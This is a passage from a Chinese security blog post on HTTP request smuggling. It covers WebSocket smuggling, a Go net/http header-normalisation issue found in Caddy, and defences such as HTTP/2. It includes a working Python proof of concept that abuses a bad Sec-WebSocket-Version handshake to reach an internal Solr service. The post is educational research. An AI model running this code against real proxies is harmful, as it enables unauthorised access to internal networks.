</span></span></code></pre></td></tr></table></div></div><h2 id=websocket>Websocket</h2><p>其实这部分完全可以作为一个独立的部分，但是感觉篇幅有点长了，这里就做一下简单的介绍，在 Hackactivity 2019 上，@0ang3el 提出了与 Websocket 相关的攻击技术 <a class=link href=https://www.slideshare.net/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis target=_blank rel=noopener>What’s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs.</a>，让我比较感兴趣的则是 Websocket Smuggling 的部分。</p><p>作者也把相关的描述放在了 <a class=link href=https://github.com/0ang3el/websocket-smuggle target=_blank rel=noopener>websocket-smuggle</a> 这里，这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理<code>Sec-WebSocket-Version</code> 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。</p><p>这里我们假设内网存在 solr 服务，外网无法访问，如果存在 websocket smuggling ，我们可以编写以下代码访问 solr 服务：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: ip:port
</span></span></span><span class=line><span class=cl><span class=s2>Sec-WebSocket-Version: 1338
</span></span></span><span class=line><span class=cl><span class=s2>Upgrade: websocket
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /solr/#/ HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: localhost:8983
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>netloc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>netloc</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print req2</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>shutdown</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SHUT_RDWR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>(</span><span class=s1>&#39;ip:port&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>在今年红帽杯上也有使用这个攻击技术的一道 CTF 赛题，相关的 writeup 可以看看 <a class=link href=https://zeddyu.github.io/2019/11/13/Red-Hat-2019/#bank-service target=_blank rel=noopener>Red Hat 2019 Web Write Up</a></p><h2 id=golang>Golang</h2><p>这个是比较有意思的一个部分，当时是在10月初 fuzz 的，然后也找了挺久的目标，最后停留在了之前同学推荐的一个中间件 <a class=link href=https://caddyserver.com/v1/ target=_blank rel=noopener>caddy</a> 上（现在是 11月 27 日，竟然出 caddy 2 了&mldr;），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境 <a class=link href=https://hub.docker.com/r/abiosoft/caddy target=_blank rel=noopener>caddy</a>。</p><p>于是就有了：</p><p><img src=https://blogpic.zdy.one/img/20191129022617.png loading=lazy></p><p>当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE 给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go 某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。</p><p>当时可开心了，赶紧噼里啪啦搜索如何给 Golang 提 issue ，结果后来仔细弄了一会，发现这个问题在 9月27日已经被提到了 <a class=link href=https://github.com/golang/go/issues/34540 target=_blank rel=noopener>net/http: invalid headers are normalized, allowing request smuggling</a>，Golang 也在 1.13.1 版修复了该问题。//悔不当初应该提早看一看这方面的内容，错过一个 CVE /捂脸</p><p>然后我仔细看了本地 Golang 版本 1.8.x &mldr;然后 Caddy 的 issue 邮件回复也到了&mldr;不出所料让我升级 Golang 到 1.13.1，<del>看了一眼 dockerhub 上的 caddy 我吐了</del></p><p>但是目前(11/27) dockerhub 上的 caddy 环境仍然还是有这个问题的，使用需谨慎！</p><h2 id=something-else>Something Else</h2><p>hackerone 上已经有相关漏洞的披露了，这里推荐几篇挖洞实战的文章：</p><p><a class=link href=https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d target=_blank rel=noopener>Write up of two HTTP Requests Smuggling</a></p><p><a class=link href=https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html target=_blank rel=noopener>HTTP Request Smuggling (CL.TE)</a></p><p><a class=link href=https://hackerone.com/reports/694604 target=_blank rel=noopener>HTTP Request Smuggling on vpn.lob.com</a></p><h1 id=defence>Defence</h1><blockquote><p>​ 从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。</p><ul><li>禁用代理服务器与后端服务器之间的TCP连接重用。</li><li>使用HTTP/2协议。</li><li>前后端使用相同的服务器。</li></ul><p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。</p></blockquote><p>然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过:</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。</p><p>具体可以参考 <a class=link href=https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5 target=_blank rel=noopener>HTTP/2 简介</a></p><p><img src=https://blogpic.zdy.one/img/20191205225455.png loading=lazy></p><h1 id=bonus>Bonus</h1><p>经过这段时间的学习研究，自己也将一些相关的实验整理成了 docker 环境，方便大家复现学习：<a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab target=_blank rel=noopener>HTTP-Smuggling-Lab</a></p><p>现在环境不多，欢迎 star，后面我会继续加入更多的环境方便大家以白盒的形式去理解学习，<del>如果我有时间的话</del></p><h1 id=references>References</h1><p><a class=link href=https://tools.ietf.org/html/rfc7230 target=_blank rel=noopener>RFC7230</a></p><p><a class=link href=https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn target=_blank rel=noopener>HTTP Desync Attacks: Request Smuggling Reborn</a></p><p><a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>HTTP request smuggling</a></p><p><a class=link href=https://regilero.github.io/tag/Smuggling/ target=_blank rel=noopener>regilero&rsquo;s blog</a></p><p><a class=link href=https://paper.seebug.org/1048/ target=_blank rel=noopener>协议层的攻击——HTTP请求走私</a></p><p><a class=link href=https://github.com/netty/netty/issues/9571 target=_blank rel=noopener>http request smuggling, cause by obfuscating TE header</a></p><p><a class=link href=https://hackerone.com/reports/648434 target=_blank rel=noopener>Multiple HTTP Smuggling reports</a></p><p><a class=link href=https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b target=_blank rel=noopener>HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/sec/>Sec</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/the-end-of-afr/><div class=article-details><h2 class=article-title>The End of AFR</h2></div></a></article><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2></div></a></article><article><a href=/p/help-you-understand-http-smuggling-in-one-article/><div class=article-details><h2 class=article-title>Help you understand HTTP Smuggling in one article</h2></div></a></article><article><a href=/p/vulnerabilites-for-a2os/><div class=article-details><h2 class=article-title>Vulnerabilites For A2OS</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ZeddYu/ZeddYu.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzMzgyODQ1OTY=" data-category=Announcements data-category-id=DIC_kwDOFCnQNM4ClsKy data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading=lazy crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script><script src=https://cdn.zdy.one/npm/quicklink@2.3.0/dist/quicklink.umd.js defer integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin=anonymous></script><script>function checkNetworkEnvironment(){if(navigator.connection){const e=navigator.connection,t=e.effectiveType==="4g"&&e.downlink>5;t?quicklink.listen():console.log("Network is poor, skipping speculation rules")}else console.log("Network Information API not supported")}window.addEventListener("load",checkNetworkEnvironment)</script></body></html>